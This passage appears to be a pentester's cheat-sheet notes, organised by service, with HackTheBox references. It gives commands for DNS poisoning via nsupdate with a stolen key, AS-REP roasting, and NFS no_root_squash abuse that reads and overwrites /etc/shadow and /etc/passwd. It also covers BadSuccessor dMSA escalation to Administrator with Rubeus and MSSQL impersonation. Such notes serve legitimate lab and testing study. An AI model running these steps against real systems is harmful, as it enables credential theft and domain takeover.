...
### Interaction:
```ad-warning
Use `binary` to enter in binary-mode and transfer binary files
```
- `ftp [IP] -P [PORT]`
...
- *Local DNS configurations files*
  - `/etc/bind/named.conf` -> Main config file; can contain secret keys for zone transfers or dynamic updates.
- `/etc/bind/named.conf.options` -> Global server options.
  - Dangerous settings:
    - `allow-query` -> which hosts can query the server
    - `allow-recursion` -> who can use this server as a resolver -> DNS amplification attacks
    - `allow-transfer` -> which hosts can zone transfer
    - `allow-update` -> anyone with the key can do DNS updates -> DNS poisoning
- `/etc/bind/bamed.conf.local`
- `/etc/bind/db.domain.com` -> Contains the records 
...
- **DNS Poisoning** (need READ on local files) -> point an undefined domain to you [snoopy.htb](https://0xdf.gitlab.io/2023/09/23/htb-snoopy.html#shell-as-cbrown)
	1. Check if there is an undefined domain 
	   ```bash
	   dig A @[IP] [UNDEFINED_DOMAIN]
	   ```
		- `status: NXDOMAIN` (non-existent domain)
		- `ANSWER: 0` (no records in answer section)
		- No IP address in the answer section
	2. `{bash} nano key` -> copy key inside, format `key "rndc-key" {[...]}` from `/etc/bind/named.conf`
	3. `nano update.txt`
		```txt
		server [VICTIM_IP]
		zone [DOMAIN]
		update add [UNDEFINED_DOMAIN] 600 IN A [KALI_IP]
		send 
		```
	4. `nsupdate -k key update.txt`
## 69u - TFTP
...
- **ASREP Roasting** (needs usernames)
    - From Linux:
	    - `GetNPUsers`
	      ```bash
	      GetNPUsers.py [DOMAIN]/ -usersfile user.txt -request -format hashcat
			```
...
- Show available Shares that can be mounted  
	...
	- `nxc nfs <IP> --shares`
- Mount a Share `
	- `{bash} nfsmount() <IP> {<PORT>}`
-  Unmount
	- `{bash}  sudo umount ./target-NFS`
### Exploit:

- **(root escape:True)** returned from nxc
	- `--get-file /etc/exports` -> check what you can rw
	- if "no_root_squash" in `exports`, also root:root files can be read. In combination with the `"rw"` flag, anyone can also upload and overwrite any files on the system and therefore just add themselves as a user.
		1. `--get-file /etc/shadow shadow`
		2. `--get-file /etc/passwd passwd`
		3. `shadow_upd passwd shadow test`
		4. `--put-file passwd '/etc/passwd'
		5. `--put-file shadow '/etc/shadow'
...
#### Badsuccessor -> https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-dmsa/
- Verify
	```bash
...
- from Linux
  ...
  ```
- from windows -> [BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
  1. `{powershell} Import-Module n:\BadSuccessor.ps1`
  2. `{powershell} BadSuccessor -mode exploit -Path "OU=<OU>,DC=<DOMAIN>,DC=htb" -Name "bad_DMSA" -DelegatedAdmin "<YOUR_USER>" -DelegateTarget "Administrator" -domain "<DOMAIN>"`
  3. `{powershell} Import-Module n:\Invoke-Rubeus.ps1`
  4. `{powershell} Invoke-Rubeus -command "tgtdeleg /nowrap"`
  5. `{powershell} Invoke-Rubeus -command "asktgs /targetuser:bad_dmsa$ /service:krbtgt/<DOOMAIN> /opsec /dmsa /nowrap /ptt /ticket:<B64_KIRBI_TICKET> /outfile:ticket.kirbi"`
  6. On Kali `{bash} echo '<B64_KIRBI_TICKET> | base64 -d > admin.kirbi`
## 500U - Ipsec/IKE VPN
- VPN / Remote access
### Enumeration
```bash
...
- **IMPERSONATE to Privesc**  
  ...
  # IMPACKET
  enum_impersonate                 # grantee can impersonate grantor
  exec_as_login / exec_as_user     # Depending on first column
  ```
...
- Authentication and connection to such RDP servers can be made, for example, using `xfreerdp`, `rdesktop`, or `Remmina` 
  ...
  ```bash
  xfreerdp3 /u:[USER] /p:"[PASSWD]" /v:[IP] /dynamic-resolution
  ```
